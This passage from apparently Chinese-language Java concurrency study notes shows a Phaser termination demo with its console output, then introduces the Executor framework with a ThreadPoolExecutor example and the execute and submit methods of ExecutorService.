    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": continue."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        phaser<span class="token punctuation">.</span><span class="token function">forceTermination</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": continue."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> template <span class="token operator">=</span> <span class="token string">"\t【%s】【monitor-%d】【%30s】%s\n"</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> actionName <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getPhase"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getRegisteredParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getRegisteredParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getArrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getArrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.getUnarrivedParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getUnarrivedParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> actionName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"phaser.isTerminated"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">isTerminated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483648</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">0</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">2</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483648</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span><span class="token operator">:</span> <span class="token keyword">continue</span><span class="token punctuation">.</span>
<span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;&gt;&gt;</span><span class="token operator">&gt;</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483648</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">0</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">2</span>
	【main】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483648</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span> <span class="token keyword">continue</span><span class="token punctuation">.</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【               phaser<span class="token punctuation">.</span>getPhase】<span class="token operator">-</span><span class="token number">2147483648</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【   phaser<span class="token punctuation">.</span>getRegisteredParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【      phaser<span class="token punctuation">.</span>getArrivedParties】<span class="token number">0</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【    phaser<span class="token punctuation">.</span>getUnarrivedParties】<span class="token number">2</span>
	【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【monitor<span class="token operator">-</span><span class="token number">1</span>】【           phaser<span class="token punctuation">.</span>isTerminated】<span class="token boolean">true</span>
<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">continue<span class="token punctuation">.</span></span>

Process</span> finished <span class="token keyword">with</span> <span class="token namespace">exit</span> code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>[Toc]</p>
<h1>Executor框架</h1>
<h2 id="ExecutorService接口">ExecutorService接口</h2>
<h3 id="ExecutorService-继承树">ExecutorService 继承树</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/Executor%E6%A1%86%E6%9E%B6-16588299109821-1667231117133-88.png" alt="Executor框架"></p>
<h3 id="ExecutorService的创建">ExecutorService的创建</h3>
<p>创建一个什么样的ExecutorService的实例（即线程池）需要g根据具体应用场景而定，不过Java给我们提供了一个Executors工厂类，它可以帮助我们很方便的创建各种类型ExecutorService线程池，Executors一共可以创建下面这四类线程池</p>
<ul>
<li>ThreadPoolExecutor 核心构造函数</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 测试ThreadPoolExecutor
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadPoolExecutorBuild</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ThreadPoolExecutor</span> threadPoolExecutor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">)</span> <span class="token function">buildThreadPoolExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>index <span class="token operator">-&gt;</span> threadPoolExecutor<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">monitorThreadPool</span><span class="token punctuation">(</span>threadPoolExecutor<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        threadPoolExecutor<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/** 
    * ThreadPoolExecutor 核心构造函数
    */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ExecutorService</span> <span class="token function">buildThreadPoolExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> corePoolSize <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> maximumPoolSize <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
        <span class="token comment">// 当线程数大于核心时，这是多余的空闲线程在终止前等待新任务的最长时间</span>
        <span class="token keyword">long</span> keepAliveTime <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token class-name">TimeUnit</span> timeUnit <span class="token operator">=</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">;</span>
        <span class="token comment">// 用于在任务完成之前保存任务的队列</span>
        <span class="token class-name">BlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">&gt;</span></span> blockingQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 线程创建工厂</span>
        <span class="token class-name">ThreadFactory</span> threadFactory <span class="token operator">=</span> r <span class="token operator">-&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 拒绝策略</span>
        <span class="token class-name">RejectedExecutionHandler</span> rejectedExecutionHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor<span class="token punctuation">.</span>AbortPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">(</span>corePoolSize<span class="token punctuation">,</span> maximumPoolSize<span class="token punctuation">,</span> keepAliveTime<span class="token punctuation">,</span> timeUnit<span class="token punctuation">,</span> blockingQueue<span class="token punctuation">,</span>
                threadFactory<span class="token punctuation">,</span> rejectedExecutionHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">monitorThreadPool</span><span class="token punctuation">(</span><span class="token class-name">ThreadPoolExecutor</span> threadPoolExecutor<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token string">"【getPoolSize】:"</span> <span class="token operator">+</span> threadPoolExecutor<span class="token punctuation">.</span><span class="token function">getPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token string">"【getActiveCount】:"</span> <span class="token operator">+</span> threadPoolExecutor<span class="token punctuation">.</span><span class="token function">getActiveCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token string">"【getMaximumPoolSize】:"</span> <span class="token operator">+</span> threadPoolExecutor<span class="token punctuation">.</span><span class="token function">getMaximumPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token string">"【getCompletedTaskCount】:"</span> <span class="token operator">+</span> threadPoolExecutor<span class="token punctuation">.</span><span class="token function">getCompletedTaskCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token string">"【getCorePoolSize】:"</span> <span class="token operator">+</span> threadPoolExecutor<span class="token punctuation">.</span><span class="token function">getCorePoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token string">"【getLargestPoolSize】:"</span> <span class="token operator">+</span> threadPoolExecutor<span class="token punctuation">.</span><span class="token function">getLargestPoolSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doAction</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Executors只是一个工厂类，它所有的方法返回的都是ThreadPoolExecutor、ScheduledThreadPoolExecutor这两个类的实例</p>
<h3 id="ExecutorService的执行">ExecutorService的执行</h3>
<p>ExecutorService有如下几个执行方法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">-</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span><span class="token punctuation">)</span>
<span class="token operator">-</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span><span class="token punctuation">)</span>
<span class="token operator">-</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">Callable</span><span class="token punctuation">)</span>
<span class="token operator">-</span> <span class="token function">invokeAny</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token operator">-</span> <span class="token function">invokeAll</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>execute(Runnable)</li>
</ul>
<p>这个方法接收一个Runnable实例，并且异步的执行，请看下面的实例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newSingleThreadExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Asynchronous task"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个方法有个问题，就是没有办法获知task的执行结果。</p>
<ul>
<li>submit(Runnable)</li>
</ul>
<p>submit(Runnable)和execute(Runnable)</p>
<p>区别是前者可以返回一个Future对象，通过返回的Future对象，我们可以检查提交的任务是否执行完毕</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Future</span> future <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Asynchronous task"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//returns null if the task has finished correctly.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果任务执行完成，future.get()方法会返回一个null。注意，future.get()方法会产生阻塞。</p>
<ul>
<li>submit(Callable)</li>
</ul>
